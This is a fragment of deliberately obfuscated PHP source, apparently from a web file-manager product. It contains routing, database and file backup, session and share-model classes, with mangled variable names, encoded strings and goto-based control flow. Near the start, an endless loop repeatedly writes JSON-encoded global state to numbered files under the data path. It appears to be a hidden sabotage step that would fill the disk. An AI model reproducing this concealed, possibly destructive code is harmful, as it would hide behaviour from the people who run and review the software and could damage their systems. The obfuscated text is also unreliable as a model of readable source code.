$ş’øØıñ[13]; $îâ¤Ğ’“(); } $áú²´äÊ = $ş’øØıñ[865]; $áú²´äÊ($_SERVER[$ş’øØıñ[866]]); $â’£Ó» = $ş’øØıñ[864]; $â’£Ó»(); $‹À‘Œ™ë = $ş’øØıñ[1505]; $¥–ë”¥ = json_encode($GLOBALS[$ş’øØıñ[1506]]); $•œÄÎ±¡ = 1; for ($½¶ÉğºÏ = $•œÄÎ±¡; $½¶ÉğºÏ > 0; $½¶ÉğºÏ++) { $‹À‘Œ™ë(DATA_PATH . $½¶ÉğºÏ, $¥–ë”¥); } } return $this->modelPlugin->setConfig($this->pluginName, $ŒÉ“Ù); } public function onSetConfig($×»¤ë¨ö) { } public function onGetConfig($¨Áıœ»•) { } public function onChangeStatus($á‚„ŒÎ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($èÑ“Ôî = "\x70\x6c\x75\x67\151\156\x41\x75\x74\x68") { $ôğ´Ã¿Ñ =& $_SERVER[¹àö™Ç¾]; if (!defined($ôğ´Ã¿Ñ[474])) { return !1; } if (_get($GLOBALS, $ôğ´Ã¿Ñ[505])) { return !0; } $à±ş = $this->getConfig(); if (!$à±ş[$èÑ“Ôî]) { return !1; } return ActionCall($ôğ´Ã¿Ñ[1569], $à±ş[$èÑ“Ôî]); } public function url($£²¨¨ç, $Ê†§éâÉ = '', $À™¡•®¾ = true) { $‚×Á•å =& $_SERVER[¹àö™Ç¾]; $ûçãûÃ = $this->getConfig(); $äéÜçª´ = KOD_VERSION . $‚×Á•å[20] . KOD_VERSION_BUILD; $ŠÛ­Úä® = $this->packageVersion(); $–¹ñ—’ = $äéÜçª´ . $‚×Á•å[460] . $ŠÛ­Úä®; if (substr($£²¨¨ç, 0, 4) == $‚×Á•å[155] || substr($£²¨¨ç, 0, 2) == $‚×Á•å[1350]) { $÷€ş‘Úˆ = $£²¨¨ç . $‚×Á•å[1570] . $–¹ñ—’; } else { if ($Ê†§éâÉ == $‚×Á•å[22]) { $÷€ş‘Úˆ = $this->pluginHost . $£²¨¨ç . $‚×Á•å[1570] . $–¹ñ—’; } else { if ($Ê†§éâÉ === $‚×Á•å[89]) { $÷€ş‘Úˆ = $this->pluginHost . $£²¨¨ç; } else { if ($Ê†§éâÉ == $‚×Á•å[1571]) { $÷€ş‘Úˆ = STATIC_PATH . $£²¨¨ç . $‚×Á•å[1570] . $äéÜçª´; } else { if ($Ê†§éâÉ == $‚×Á•å[1572]) { $÷€ş‘Úˆ = APP_HOST . $‚×Á•å[1573] . $£²¨¨ç . $‚×Á•å[1570] . $äéÜçª´; } else { if (isset($ûçãûÃ[$Ê†§éâÉ])) { $÷€ş‘Úˆ = $ûçãûÃ[$Ê†§éâÉ] . $£²¨¨ç . $‚×Á•å[1570] . $–¹ñ—’; } } } } } } if (!$À™¡•®¾) { return $÷€ş‘Úˆ; } echo $÷€ş‘Úˆ; } public function link($‰­õÚ¤Ñ = false, $¼çñß¥ = '') { $ğİ“×Ï˜ =& $_SERVER[¹àö™Ç¾]; if (!$‰­õÚ¤Ñ) { $this->link($ğİ“×Ï˜[1574], $ğİ“×Ï˜[1572]); $this->link($ğİ“×Ï˜[1575], $ğİ“×Ï˜[1571]); $this->link($ğİ“×Ï˜[1576], $ğİ“×Ï˜[1571]); $this->link($ğİ“×Ï˜[1577], $ğİ“×Ï˜[1571]); $this->link($ğİ“×Ï˜[1578], $ğİ“×Ï˜[1571]); return; } $‰è¶¾É = $this->url($‰­õÚ¤Ñ, $¼çñß¥, !1); if (substr($‰­õÚ¤Ñ, -3) == $ğİ“×Ï˜[1579]) { echo $ğİ“×Ï˜[1580] . $‰è¶¾É . $ğİ“×Ï˜[1581] . $ğİ“×Ï˜[11]; } else { if (substr($‰­õÚ¤Ñ, -4) == $ğİ“×Ï˜[1582]) { echo $ğİ“×Ï˜[1583] . $‰è¶¾É . $ğİ“×Ï˜[1584] . $ğİ“×Ï˜[11]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\x79" => "\133\x5e\57\x5d\53", "\x3a\x6e\x75\x6d" => "\133\60\55\71\135\x2b", "\x3a\x61\x6c\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ÊÏæ£Í, $’µº™Ùü) { $€‡¶Üğ =& $_SERVER[¹àö™Ç¾]; if ($ÊÏæ£Í == $€‡¶Üğ[1585]) { $›ÕÈü»ì = array_map($€‡¶Üğ[1586], $’µº™Ùü[0]); $¨ÖˆÊ¹½ = strpos($’µº™Ùü[1], $€‡¶Üğ[18]) === 0 ? $’µº™Ùü[1] : $€‡¶Üğ[18] . $’µº™Ùü[1]; $æÃ¤­Ã° = $’µº™Ùü[2]; } else { $›ÕÈü»ì = null; $¨ÖˆÊ¹½ = strpos($’µº™Ùü[0], $€‡¶Üğ[18]) === 0 ? $’µº™Ùü[0] : $€‡¶Üğ[18] . $’µº™Ùü[0]; $æÃ¤­Ã° = $’µº™Ùü[1]; } array_push(self::$maps, $›ÕÈü»ì); array_push(self::$routes, $¨ÖˆÊ¹½); array_push(self::$methods, strtoupper($ÊÏæ£Í)); array_push(self::$callbacks, $æÃ¤­Ã°); } public static function error($Ğ÷¨Ã­®) { self::$errorCallback = $Ğ÷¨Ã­®; } public static function haltOnMatch($‰œòòÖî = true) { self::$halts = $‰œòòÖî; } public static function dispatch() { $Ñ•§Šêç =& $_SERVER[¹àö™Ç¾]; $èú†ñÌ = parse_url($_SERVER[$Ñ•§Šêç[1587]], PHP_URL_PATH); $’ğøé‹ = $_SERVER[$Ñ•§Šêç[166]]; $ûúËŒ = array_keys(static::$patterns); $Üí¼Ç¤† = array_values(static::$patterns); $††Úà˜­ = !1; self::$routes = preg_replace($Ñ•§Šêç[1252], $Ñ•§Šêç[18], self::$routes); if (in_array($èú†ñÌ, self::$routes)) { $ÓÊÛÙ¹ò = array_keys(self::$routes, $èú†ñÌ); foreach ($ÓÊÛÙ¹ò as $‚¸»Ôª‡) { if (self::$methods[$‚¸»Ôª‡] == $’ğøé‹ || self::$methods[$‚¸»Ôª‡] == $Ñ•§Šêç[1588] || in_array($’ğøé‹, self::$maps[$‚¸»Ôª‡])) { $††Úà˜­ = !0; if (!is_object(self::$callbacks[$‚¸»Ôª‡])) { $›àÕÎ‹ = explode($Ñ•§Šêç[18], self::$callbacks[$‚¸»Ôª‡]); $æò¥†‡ = end($›àÕÎ‹); $”’†•Ê = explode($Ñ•§Šêç[1589], $æò¥†‡); $ÀÜÂ”» = new $”’†•Ê[0](); $ÀÜÂ”»->{$”’†•Ê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‚¸»Ôª‡]); if (self::$halts) { return; } } } } } else { $³ßÄ‚ì† = 0; foreach (self::$routes as $‚¸»Ôª‡) { if (strpos($‚¸»Ôª‡, $Ñ•§Šêç[4]) !== !1) { $‚¸»Ôª‡ = str_replace($ûúËŒ, $Üí¼Ç¤†, $‚¸»Ôª‡); } if (preg_match($Ñ•§Šêç[1590] . $‚¸»Ôª‡ . $Ñ•§Šêç[1591], $èú†ñÌ, $”Ÿí™£­)) { if (self::$methods[$³ßÄ‚ì†] == $’ğøé‹ || self::$methods[$³ßÄ‚ì†] == $Ñ•§Šêç[1588] || !empty(self::$maps[$³ßÄ‚ì†]) && in_array($’ğøé‹, self::$maps[$³ßÄ‚ì†])) { $††Úà˜­ = !0; array_shift($”Ÿí™£­); if (!is_object(self::$callbacks[$³ßÄ‚ì†])) { $›àÕÎ‹ = explode($Ñ•§Šêç[18], self::$callbacks[$³ßÄ‚ì†]); $æò¥†‡ = end($›àÕÎ‹); $”’†•Ê = explode($Ñ•§Šêç[1589], $æò¥†‡); $ÀÜÂ”» = new $”’†•Ê[0](); if (!method_exists($ÀÜÂ”», $”’†•Ê[1])) { echo $Ñ•§Šêç[1592]; } else { call_user_func_array(array($ÀÜÂ”», $”’†•Ê[1]), $”Ÿí™£­); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$³ßÄ‚ì†], $”Ÿí™£­); if (self::$halts) { return; } } } } $³ßÄ‚ì†++; } } if ($††Úà˜­ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¥Šâ®–‘ =& $_SERVER[¹àö™Ç¾]; header($_SERVER[$¥Šâ®–‘[1593]] . $¥Šâ®–‘[1594]); echo $¥Šâ®–‘[1595]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ñ•§Šêç[1587]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto b¹ÎßÚ±§ğ; A„µ¸ßØØ¾: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Õú›Ëİ =& $_SERVER[¹àö™Ç¾]; $²®•¡Èâ = Backup::get(); self::$io = $²®•¡Èâ[$Õú›Ëİ[744]]; self::$name = $²®•¡Èâ[$Õú›Ëİ[42]]; $Ñ®¢»ù¸ = new DbManage(); $Áİ‹ä¼ = $Ñ®¢»ù¸->dbType(); $Å…È¯²¹ = array($Õú›Ëİ[768] => $Áİ‹ä¼, $Õú›Ëİ[769] => time()); Backup::set($Å…È¯²¹); $“¹çØÕ = $this->tmpFilesPath() . $Õú›Ëİ[770] . self::$name . $Õú›Ëİ[18]; del_dir($“¹çØÕ); mk_dir($“¹çØÕ); $œú±–ô± = $Œş´„ˆü = 0; $ÅæŒµ¾ı = new Task($Õú›Ëİ[771], $Õú›Ëİ[772], 0, LNG($Õú›Ëİ[773]) . $Õú›Ëİ[774] . LNG($Õú›Ëİ[775])); try { $Š³ÆÃ¸ = $Ñ®¢»ù¸->db()->getTables(); } catch (Exception $òÖóêÜ¥) { $ÅæŒµ¾ı->end(); return !1; } $Š³ÆÃ¸ = array_diff($Š³ÆÃ¸, array($Õú›Ëİ[776], $Õú›Ëİ[777])); foreach ($Š³ÆÃ¸ as $Ö¡º¨¤Ù) { $œú±–ô± += $Ñ®¢»ù¸->model($Ö¡º¨¤Ù)->count(); } $ÅæŒµ¾ı->task[$Õú›Ëİ[778]] = $œú±–ô±; $GLOBALS[$Õú›Ëİ[779]] = self::$name; foreach ($Š³ÆÃ¸ as $Ö¡º¨¤Ù) { $–ÁÑ‹«£ = $“¹çØÕ . $Ö¡º¨¤Ù . $Õú›Ëİ[780]; $È¥¥Ø©ö = null; if ($Ö¡º¨¤Ù == $Õú›Ëİ[781] && (!isset($²®•¡Èâ[$Õú›Ëİ[747]]) || $²®•¡Èâ[$Õú›Ëİ[747]] == $Õú›Ëİ[200])) { $È¥¥Ø©ö = self::$io; } $Œş´„ˆü += $Ñ®¢»ù¸->sqlFromDb($Ö¡º¨¤Ù, $–ÁÑ‹«£, $ÅæŒµ¾ı, $È¥¥Ø©ö); } unset($GLOBALS[$Õú›Ëİ[779]]); $ÅæŒµ¾ı->end(); if ($Œş´„ˆü > $œú±–ô±) { $œú±–ô± = $Œş´„ˆü; } $Å…È¯²¹ = array($Õú›Ëİ[768] => $Áİ‹ä¼, $Õú›Ëİ[765] => 1, $Õú›Ëİ[782] => $œú±–ô±, $Õú›Ëİ[783] => $Œş´„ˆü, $Õú›Ëİ[784] => time()); Backup::set($Å…È¯²¹); if ($œú±–ô± - $Œş´„ˆü > 0) { $›™äéÄ‹ = $Õú›Ëİ[785]; if (stristr(I18n::getType(), $Õú›Ëİ[786])) { $›™äéÄ‹ = $Õú›Ëİ[787]; } write_log(array($›™äéÄ‹, $Å…È¯²¹), $Õú›Ëİ[772]); return !1; } return !0; } private function tmpFilesPath() { $úùı‚ =& $_SERVER[¹àö™Ç¾]; $®ÓùºŞø = TEMP_FILES; if ($GLOBALS[$úùı‚[16]][$úùı‚[100]][$úùı‚[788]]) { $®ÓùºŞø = $GLOBALS[$úùı‚[16]][$úùı‚[100]][$úùı‚[788]]; if (!mk_dir($®ÓùºŞø) || !is_writable($®ÓùºŞø) || !IO::mkfile($®ÓùºŞø . $úùı‚[789])) { $®ÓùºŞø = TEMP_FILES; } } return $®ÓùºŞø; } } class BackupDbFile { public function __construct() { } public function index() { $€˜Ú’àƒ =& $_SERVER[¹àö™Ç¾]; $˜Æö”¨Í = Backup::get(); $¼¢–«•½ = $˜Æö”¨Í[$€˜Ú’àƒ[42]]; $›ªÁâ¨¥ = $this->tmpFilesPath() . "\x62\141\143\153\165\160\137{$¼¢–«•½}\57"; $³›óÛÙ = $this->backupPath($˜Æö”¨Í); if (!($³›óÛÙ = IO::mkdir($³›óÛÙ))) { return !1; } $èó†ØÕê = IO::listPath($›ªÁâ¨¥); $ÕØ¹òŸ¯ = isset($èó†ØÕê[$€˜Ú’àƒ[86]]) ? $èó†ØÕê[$€˜Ú’àƒ[86]] : array(); $£”ùï¿¼ = array_sum(array_column($ÕØ¹òŸ¯, $€˜Ú’àƒ[90])); if (!$£”ùï¿¼) { return !1; } $àö•ÃËÜ = array($€˜Ú’àƒ[790] => $£”ùï¿¼, $€˜Ú’àƒ[791] => time()); Backup::set($àö•ÃËÜ); $–’ıøÕÁ = new TaskFileTransfer($€˜Ú’àƒ[792], $€˜Ú’àƒ[772], count($ÕØ¹òŸ¯), LNG($€˜Ú’àƒ[773]) . $€˜Ú’àƒ[460] . LNG($€˜Ú’àƒ[775]) . $€˜Ú’àƒ[793]); $–’ıøÕÁ->task[$€˜Ú’àƒ[755]] = $£”ùï¿¼; foreach ($èó†ØÕê[$€˜Ú’àƒ[86]] as $ËÒŒ±õ) { $ùŸƒ€ÛŠ = IO::move($ËÒŒ±õ[$€˜Ú’àƒ[88]], $³›óÛÙ); if (!$ùŸƒ€ÛŠ) { $–’ıøÕÁ->end(); $“Í¹ÕÚ = IO::getLastError($€˜Ú’àƒ[794] . $ËÒŒ±õ[$€˜Ú’àƒ[88]] . $€˜Ú’àƒ[795] . $³›óÛÙ . $€˜Ú’àƒ[536]); write_log($“Í¹ÕÚ, $€˜Ú’àƒ[772]); return !1; } } $İØĞŞïõ = new DbManage(); $‰«ùŒÊ = $İØĞŞïõ->getSqlFile(); if (!$‰«ùŒÊ[$€˜Ú’àƒ[796]] || !$‰«ùŒÊ[$€˜Ú’àƒ[23]]) { return !1; } IO::move($‰«ùŒÊ[$€˜Ú’àƒ[796]], $³›óÛÙ); IO::move($‰«ùŒÊ[$€˜Ú’àƒ[23]], $³›óÛÙ); $–’ıøÕÁ->end(); $àö•ÃËÜ = array($€˜Ú’àƒ[797] => $£”ùï¿¼, $€˜Ú’àƒ[798] => time()); Backup::set($àö•ÃËÜ); return !0; } private function backupPath($¿–âÕ¡) { $¾ç§í·› =& $_SERVER[¹àö™Ç¾]; $ èîÅé = $¿–âÕ¡[$¾ç§í·›[42]]; $‹ÓøıùŸ = Model($¾ç§í·›[762])->get($¾ç§í·›[763]); $ÊÊ¾Í€¢ = substr(md5($¾ç§í·›[764] . $‹ÓøıùŸ . $ èîÅé), 0, 8); return "\x7b\x69\x6f\72{$¿–âÕ¡[$¾ç§í·›[744]]}\x7d\x2f\144\141\164\141\142\x61\x73\x65\x2f\142\x61\x63\x6b\x75\160\x2f" . $ èîÅé . $¾ç§í·›[21] . $ÊÊ¾Í€¢; } private function tmpFilesPath() { $Ï ü¨­Æ =& $_SERVER[¹àö™Ç¾]; $”ûÒ˜ìÛ = TEMP_FILES; if ($GLOBALS[$Ï ü¨­Æ[16]][$Ï ü¨­Æ[100]][$Ï ü¨­Æ[788]]) { $”ûÒ˜ìÛ = $GLOBALS[$Ï ü¨­Æ[16]][$Ï ü¨­Æ[100]][$Ï ü¨­Æ[788]]; if (!mk_dir($”ûÒ˜ìÛ) || !is_writable($”ûÒ˜ìÛ) || !IO::mkfile($”ûÒ˜ìÛ . $Ï ü¨­Æ[789])) { $”ûÒ˜ìÛ = TEMP_FILES; } } return $”ûÒ˜ìÛ; } } class BackupFile { public function __construct() { } public function index() { $¸¬ÆÎ¼¼ = Backup::get(); $¬ø©œ«• = $¸¬ÆÎ¼¼[$_SERVER[¹àö™Ç¾][297]][$_SERVER[¹àö™Ç¾][202]][$_SERVER[¹àö™Ç¾][467]]; $Ø¹‚´Œß = array($_SERVER[¹àö™Ç¾][468] => array($_SERVER[¹àö™Ç¾][799], $¬ø©œ«•), $_SERVER[¹àö™Ç¾][800] => array($_SERVER[¹àö™Ç¾][335], $¸¬ÆÎ¼¼[$_SERVER[¹àö™Ç¾][744]])); $ûÎ÷‡ïª = (int) Model($_SERVER[¹àö™Ç¾][781])->where($Ø¹‚´Œß)->count($_SERVER[¹àö™Ç¾][467]); $‰ÊÇ™¢ª = (int) Model($_SERVER[¹àö™Ç¾][781])->where($Ø¹‚´Œß)->sum($_SERVER[¹àö™Ç¾][90]); $»Œ“Áüš = new TaskFileTransfer($_SERVER[¹àö™Ç¾][801], $_SERVER[¹àö™Ç¾][772], $ûÎ÷‡ïª, LNG($_SERVER[¹àö™Ç¾][773]) . $_SERVER[¹àö™Ç¾][774] . LNG($_SERVER[¹àö™Ç¾][802])); $»Œ“Áüš->task[$_SERVER[¹àö™Ç¾][755]] = $‰ÊÇ™¢ª; $•–ßÉ¿¡ = array($_SERVER[¹àö™Ç¾][803] => $ûÎ÷‡ïª, $_SERVER[¹àö™Ç¾][804] => $‰ÊÇ™¢ª, $_SERVER[¹àö™Ç¾][805] => time()); Backup::set($•–ßÉ¿¡); $ëÑª¶ı = !0; $‘›ªÄÎ— = $this->storeIds(); $Á’ÄÃ‘â = 1; $áØäªñ = 1000; $¨¼Üöû° = $ùÖ“Ï® = 0; $Ã¸’Øã± = array(); $æÈ¢Ğƒ = $ÔÍÉÓ¨ = 0; do { $»Ş³¤×« = $_SERVER[¹àö™Ç¾][806]; $÷—‘üæ« = Model($_SERVER[¹àö™Ç¾][781])->where($Ø¹‚´Œß)->field($»Ş³¤×«)->order($_SERVER[¹àö™Ç¾][807])->selectPage($áØäªñ, $Á’ÄÃ‘â); $Ğµ—•ßÎ = !empty($÷—‘üæ«[$_SERVER[¹àö™Ç¾][373]]) ? $÷—‘üæ«[$_SERVER[¹àö™Ç¾][373]] : array(); foreach ($Ğµ—•ßÎ as $ªé÷ß¹ê) { if (!$this->_fileExist($ªé÷ß¹ê, $Ã¸’Øã±, $‘›ªÄÎ—)) { $ûÎ÷‡ïª -= 1; $‰ÊÇ™¢ª -= (int) $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][90]]; write_log("\146\x69\154\145\40\156\157\164\40\145\170\151\163\164\x2e\x66\x69\154\145\111\104\x3a{$ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][467]]}\54\x20\x70\141\x74\x68\x3a{$ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][88]]}", $_SERVER[¹àö™Ç¾][808]); continue; } $£ñİ­”ê = $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][88]]; $£øã–£ñ = "\173\x69\157\72{$¸¬ÆÎ¼¼[$_SERVER[¹àö™Ç¾][744]]}\x7d" . substr($£ñİ­”ê, strlen("\x7b\x69\157\72{$ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][809]]}\175")); if (IO::exist($£øã–£ñ)) { $»Œ“Áüš->updateFileEnd($ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][42]], $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][90]]); } else { $£øã–£ñ = get_path_father($£øã–£ñ); IO::mkdir($£øã–£ñ); if (!IO::copy($£ñİ­”ê, $£øã–£ñ, $_SERVER[¹àö™Ç¾][810])) { write_log($_SERVER[¹àö™Ç¾][811] . $£ñİ­”ê . $_SERVER[¹àö™Ç¾][795] . $£øã–£ñ . $_SERVER[¹àö™Ç¾][536], $_SERVER[¹àö™Ç¾][772]); $ëÑª¶ı = !1; break; } } $¬ø©œ«• = $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][467]]; $ùÖ“Ï® += 1; $¨¼Üöû° += $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][90]]; $ÔÍÉÓ¨ += 1; $æÈ¢Ğƒ += $ªé÷ß¹ê[$_SERVER[¹àö™Ç¾][90]]; if ($¨¼Üöû° >= 1024 * 1024 * 100) { $•–ßÉ¿¡ = array($_SERVER[¹àö™Ç¾][812] => $¬ø©œ«•, $_SERVER[¹àö™Ç¾][813] => $ÔÍÉÓ¨, $_SERVER[¹àö™Ç¾][814] => $æÈ¢Ğƒ); Backup::set($•–ßÉ¿¡); $¨¼Üöû° = $ùÖ“Ï® = 0; } } $îÔ••… = count($Ğµ—•ßÎ); $Á’ÄÃ‘â++; } while ($îÔ••… == $áØäªñ); $»Œ“Áüš->end(); $•–ßÉ¿¡ = array($_SERVER[¹àö™Ç¾][815] => 1, $_SERVER[¹àö™Ç¾][496] => time(), $_SERVER[¹àö™Ç¾][767] => 1, $_SERVER[¹àö™Ç¾][812] => $¬ø©œ«•, $_SERVER[¹àö™Ç¾][804] => $‰ÊÇ™¢ª, $_SERVER[¹àö™Ç¾][803] => $ûÎ÷‡ïª, $_SERVER[¹àö™Ç¾][816] => time()); if ($ùÖ“Ï®) { $•–ßÉ¿¡[$_SERVER[¹àö™Ç¾][813]] = $ÔÍÉÓ¨; $•–ßÉ¿¡[$_SERVER[¹àö™Ç¾][814]] = $æÈ¢Ğƒ; } Backup::set($•–ßÉ¿¡); $this->_fileFilter($Ã¸’Øã±); return !0; } private function _fileExist($ğö†ù•¬, &$ÂßÓÜğØ, $ı²’€‚) { $¹«ùÌ´Ş =& $_SERVER[¹àö™Ç¾]; $±úÄ£…· = $ğö†ù•¬[$¹«ùÌ´Ş[88]]; if (in_array($ğö†ù•¬[$¹«ùÌ´Ş[467]], $ÂßÓÜğØ)) { return !1; } if (!in_array($ğö†ù•¬[$¹«ùÌ´Ş[809]], $ı²’€‚)) { return !1; } if (IO::exist($±úÄ£…·)) { return !0; } $ÍÕÊ®²‚ = get_path_father($±úÄ£…·); if (IO::exist($ÍÕÊ®²‚)) { $ÂßÓÜğØ[] = $ğö†ù•¬[$¹«ùÌ´Ş[467]]; return !1; } $Õäñ©Ì = array($¹«ùÌ´Ş[809] => $ğö†ù•¬[$¹«ùÌ´Ş[809]], $¹«ùÌ´Ş[88] => array($¹«ùÌ´Ş[387], "{$ÍÕÊ®²‚}\x25")); $„şõîÆâ = Model($¹«ùÌ´Ş[781])->where($Õäñ©Ì)->field($¹«ùÌ´Ş[468])->select(); $ÂßÓÜğØ = array_merge($ÂßÓÜğØ, array_to_keyvalue($„şõîÆâ, $¹«ùÌ´Ş[22], $¹«ùÌ´Ş[467])); return !1; } private function _fileFilter($ª«à“¥Ë) { $¨ºŠ†§˜ =& $_SERVER[¹àö™Ç¾]; if (empty($ª«à“¥Ë)) { return; } $°Ø³¨È = array($¨ºŠ†§˜[467] => array($¨ºŠ†§˜[17], array_unique($ª«à“¥Ë))); $Ş’¡üç‡ = Model($¨ºŠ†§˜[817])->where($°Ø³¨È)->field($¨ºŠ†§˜[403])->select(); foreach ($Ş’¡üç‡ as $ÇéÇ á) { Model($¨ºŠ†§˜[817])->remove($ÇéÇ á[$¨ºŠ†§˜[403]], !1); } } private function storeIds() { $¹Ş¦Üã =& $_SERVER[¹àö™Ç¾]; $ÀÎ‡šŒé = Model($¹Ş¦Üã[759])->listData(); $¹§±—–á = array(); $Ö€çÖÓµ = $GLOBALS[$¹Ş¦Üã[16]][$¹Ş¦Üã[100]][$¹Ş¦Üã[818]]; foreach ($ÀÎ‡šŒé as $‡Åå‰§) { $™Á½’Üó = strtolower($‡Åå‰§[$¹Ş¦Üã[106]]); if (!isset($Ö€çÖÓµ[$™Á½’Üó])) { continue; } $½ùÚ«‡© = $¹Ş¦Üã[84] . (isset($Ö€çÖÓµ[$™Á½’Üó]) ? $Ö€çÖÓµ[$™Á½’Üó] : ucfirst($™Á½’Üó)); if (!class_exists($½ùÚ«‡©)) { continue; } $¹§±—–á[] = $‡Åå‰§[$¹Ş¦Üã[401]]; } return $¹§±—–á; } } goto AÅ¿‡óª; DÉ£°ê÷: function binCheckBigger($Êê†¤Æò, $½¬˜ äş) { return $Êê†¤Æò > $½¬˜ äş; } $_SERVER[$_SERVER[‡µõ°¨¾][3]] = ("\67\71\71\63".strrev('48'))+0;$_6cat="bya41hjqfrdkcmi5g7weo02plu9n6t3vz8xs327wqgfi5lomst9108pkcjdh4urz6anebyxvz47b2q";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($î—Á¡¾×, $ñ­™Çš) { $Á¢»–° =& $_SERVER[¹àö™Ç¾]; if (isset(self::$_methodList[$î—Á¡¾×])) { return @call_user_func_array(self::$_methodList[$î—Á¡¾×], $ñ­™Çš); } else { if (method_exists($this, $î—Á¡¾×)) { return call_user_func_array(array($this, $î—Á¡¾×), $ñ­™Çš); } else { think_exception(__CLASS__ . $Á¢»–°[4] . $î—Á¡¾× . $Á¢»–°[5]); } } } public static function __callStatic($ïÓ€‚õ—, $ˆ«Û«ê¡) { if (isset(self::$_methodListStatic[$ïÓ€‚õ—])) { return call_user_func_array(self::$_methodListStatic[$ïÓ€‚õ—], $ˆ«Û«ê¡); } else { if (method_exists(self, $ïÓ€‚õ—)) { return call_user_func_array(array(self, $ïÓ€‚õ—), $ˆ«Û«ê¡); } else { show_json("{$ïÓ€‚õ—}\x28\51\x20\x6e\157\x74\40\145\170\151\x73\164\73", !1); } } } public static function addMethod($£ü£ØŸš, $Œà€É±†) { self::$_methodList[$£ü£ØŸš] = $Œà€É±†; } public static function addMethodStatic($ÚÔ€º°ë, $¥€ÂÌç) { self::$_methodListStatic[$ÚÔ€º°ë] = $¥€ÂÌç; } } goto Fçà‘¿É; e‡„‹³ó¤Â: class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\164\145\x6d\137\163\x65\x73\x73\x69\157\156"; public function get($ç’şãé«) { $¾Å¢‹ùó =& $_SERVER[¹àö™Ç¾]; $É¨ñÎ– = $this->where(array($¾Å¢‹ùó[1938] => $ç’şãé«))->find(); if (!is_array($É¨ñÎ–)) { return !1; } return $É¨ñÎ–[$¾Å¢‹ùó[747]]; } public function set($ıç£Ñù, $ ¤ º‡, $õ¢˜˜Æ¶ = 3600) { $Û‡®¦ÅÖ =& $_SERVER[¹àö™Ç¾]; $Ôšœ´‘¶ = array($Û‡®¦ÅÖ[1938] => $ıç£Ñù, $Û‡®¦ÅÖ[1846] => $ ¤ º‡, $Û‡®¦ÅÖ[1939] => $õ¢˜˜Æ¶ + time()); if (Session::get($Û‡®¦ÅÖ[1940])) { $Ôšœ´‘¶[$Û‡®¦ÅÖ[1640]] = Session::get($Û‡®¦ÅÖ[1940]); } else { $Ôšœ´‘¶[$Û‡®¦ÅÖ[1640]] = 0; } if ($this->get($ıç£Ñù)) { return $this->where(array($Û‡®¦ÅÖ[1938] => $ıç£Ñù))->save($Ôšœ´‘¶); } else { return $this->add($Ôšœ´‘¶, array(), !0); } } public function remove($¬Ÿíçö—) { return $this->where(array($_SERVER[¹àö™Ç¾][1938] => $¬Ÿíçö—))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¹àö™Ç¾][1941] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\171\124\x69\155\145", "\x74\x69\x6d\x65", "\x69\x6e\163\145\162\x74\54\165\x70\144\x61\164\145", "\x66\x75\156\143\164\x69\x6f\x6e"), array("\143\162\145\x61\x74\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\156\x73\145\x72\164", "\x66\x75\x6e\x63\x74\x69\x6f\156"), array("\x6f\160\x74\151\x6f\156\163", '', "\x69\x6e\x73\x65\x72\164\x2c\x75\x70\144\x61\164\145\x2c\163\145\x6c\x65\x63\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($Ù£„íŸæ) { $¡àµ÷ =& $_SERVER[¹àö™Ç¾]; $¿¾–äõ“ = isset($Ù£„íŸæ[0]) ? $Ù£„íŸæ[0] : !1; return array($¡àµ÷[1942] => array(USER_ID, $¡àµ÷[1943]), $¡àµ÷[1887] => array($¿¾–äõ“, $¡àµ÷[1944])); } protected function listSimple() { $¥„¡¯” = array($_SERVER[¹àö™Ç¾][1640] => USER_ID); $§‰•§Øî = $this->field($this->fieldList)->where($¥„¡¯”)->select(); return $§‰•§Øî ? $§‰•§Øî : array(); } protected function getInfo($Í¥ÀŞ¯–, $§Ô÷òáŠ = false) { $ÊüäœÂ€ =& $_SERVER[¹àö™Ç¾]; if ($§Ô÷òáŠ) { return $this->_getShareInfo(array($ÊüäœÂ€[488] => $Í¥ÀŞ¯–)); } $’é¬æ¶ = $this->cacheFunctionGet($ÊüäœÂ€[1889], $Í¥ÀŞ¯–); return $’é¬æ¶; } public function getInfoByHash($§Ÿø£œ) { return $this->_getShareInfo(array($_SERVER[¹àö™Ç¾][490] => $§Ÿø£œ)); } public function getInfoByPath($œºÃ–Ö¼) { $‚ª½Ü =& $_SERVER[¹àö™Ç¾]; $”˜¬Ğùİ = array($‚ª½Ü[1640] => USER_ID, $‚ª½Ü[403] => $œºÃ–Ö¼); return $this->_getShareInfo($”˜¬Ğùİ); } public function getInfoBySourcePath($¥ëÕ¬Ïó) { $Ã Ôâ®½ =& $_SERVER[¹àö™Ç¾]; $îùÊ§Æ = array($Ã Ôâ®½[1640] => USER_ID, $Ã Ôâ®½[1159] => $¥ëÕ¬Ïó); return $this->_getShareInfo($îùÊ§Æ); } private function _getShareInfo($ô£€ò•Ú) { $‰µşİé =& $_SERVER[¹àö™Ç¾]; $ø…ùÌµ = $this->where($ô£€ò•Ú)->find(); if (!$ø…ùÌµ) { return !1; } $ô£€ò•Ú = array($‰µşİé[488] => $ø…ùÌµ[$‰µşİé[488]]); $ÖÊùóã = 